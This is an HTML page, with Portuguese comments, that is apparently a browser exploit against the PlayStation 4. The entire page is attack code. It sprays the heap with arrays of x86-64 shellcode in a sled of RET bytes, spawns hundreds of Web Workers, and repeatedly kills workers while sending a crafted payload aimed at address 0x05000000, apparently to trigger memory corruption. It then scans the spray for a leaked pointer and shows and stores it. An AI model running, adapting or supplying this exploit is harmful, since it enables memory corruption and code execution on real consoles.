<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 FEATHER LEAKER</title>
    <style>
        body { background-color: #000; color: #fff; font-family: monospace; text-align: center; padding: 20px; }
        #status { font-size: 1.5em; border: 1px solid #555; padding: 20px; margin: 20px 0; background: #111; }
        #result { font-size: 2.5em; color: #0f0; background: #004; padding: 15px; display: none; border: 2px solid #0f0; }
        .success { background-color: #050 !important; }
    </style>
</head>
<body>

    <h1>FEATHER LEAKER (NATIVE FILL)</h1>
    <div id="status">INICIANDO...</div>
    <div id="result"></div>

    <script>
        // CONFIGURAÇÃO
        const TARGET_THREADS = 417; 
        const SPRAY_SIZE = 512;
        const TARGET_OFFSET = 384; 
        
        // ALVO: 0x05000000 (Muito baixo = Menos RAM necessária)
        const ADDR_BYTE_3 = 0x05; 

        let workers = [];
        let heapSpray = [];
        
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        // SHELLCODE
        const code = new Uint8Array([
            0x48, 0x8B, 0x04, 0x24,       // mov rax, [rsp] 
            0x48, 0x8D, 0x3D, 0x08, 0x00, 0x00, 0x00, // lea rdi, [rip+8]
            0x48, 0x89, 0x07,             // mov [rdi], rax
            0xC3,                         // ret
            0x00, 0x00, 0x00, 0x00,       // Slot Leitura
            0x00, 0x00, 0x00, 0x00        // Slot Leitura
        ]);
        const code32 = new Uint32Array(code.buffer);

        function start() {
            document.getElementById('status').innerText = "1. SPRAY NATIVO (LEVE)...";
            
            setTimeout(() => {
                try {
                    // TÉCNICA OTIMIZADA:
                    // Aloca 128MB. Isso deve ser suficiente para cobrir 0x05000000
                    for(let i=0; i<300; i++) { 
                        let arr = new Uint32Array(0x4000); // 64KB
                        
                        // Passo 1: Enche com RET (0xC3) nativamente (Muito rápido e leve)
                        arr.fill(0xC3C3C3C3); 
                        
                        // Passo 2: Coloca o Shellcode APENAS no início e a cada 256 bytes
                        // Isso cria "ilhas" de shellcode em um mar de RETs
                        for(let k=0; k < arr.length; k+=64) {
                            arr.set(code32, k);
                        }
                        
                        heapSpray.push(arr);
                    }
                    
                    document.getElementById('status').innerText = "2. INICIANDO THREADS...";
                    startThreads();
                    
                } catch(e) {
                    document.getElementById('status').innerText = "OOM. Tente reiniciar o PS4.";
                }
            }, 500);
        }

        function startThreads() {
            let i = setInterval(() => {
                if (workers.length < TARGET_THREADS) {
                    workers.push(new Worker(url));
                } else {
                    clearInterval(i);
                    // Scanner Rápido
                    setInterval(scan, 200);
                    // Ataque
                    setTimeout(attack, 2000);
                }
            }, 30);
        }

        function attack() {
            const st = document.getElementById('status');
            if(st.className.includes('success')) return;
            
            st.innerText = ">>> ATAQUE (ALVO 0x05...) <<<";
            
            const payload = new Uint8Array(SPRAY_SIZE);
            payload.fill(0x00); 
            payload[TARGET_OFFSET] = 0x00;
            payload[TARGET_OFFSET+1] = 0x00;
            payload[TARGET_OFFSET+2] = 0x00;
            payload[TARGET_OFFSET+3] = ADDR_BYTE_3; // 0x05

            setInterval(() => {
                const w = new Worker(killerUrl);
                w.terminate();
                try { if(workers.length > 0) workers[0].postMessage(payload); } catch(e){}
            }, 10);
        }

        function scan() {
            for(let i=0; i<heapSpray.length; i+=2) {
                const arr = heapSpray[i];
                // Checa os locais onde escrevemos o shellcode
                for(let k=0; k<arr.length; k+=64) {
                    // O slot de leak fica no offset 4 (bytes 16-20)
                    let leakIdx = k + 4;
                    if(leakIdx < arr.length) {
                         if (arr[leakIdx] !== 0 && arr[leakIdx] !== 0) {
                            // Verifica parte alta
                            if(arr[leakIdx+1] !== 0) {
                                report(arr[leakIdx], arr[leakIdx+1]);
                                return;
                            }
                         }
                    }
                }
            }
        }

        function report(low, high) {
            const hLow = (low >>> 0).toString(16).padStart(8, '0');
            const hHigh = (high >>> 0).toString(16).padStart(8, '0');
            const addr = `0x${hHigh}${hLow}`;
            
            document.getElementById('status').innerText = "SUCESSO!";
            document.getElementById('status').className = "success";
            
            const res = document.getElementById('result');
            res.style.display = "block";
            res.innerText = addr;

            // Salva no cache por segurança
            localStorage.setItem('ps4_leak', addr);

            // Mata tudo
            workers.forEach(w => w.terminate());
            workers = [];
        }

        setTimeout(start, 1000);

    </script>
</body>
</html>
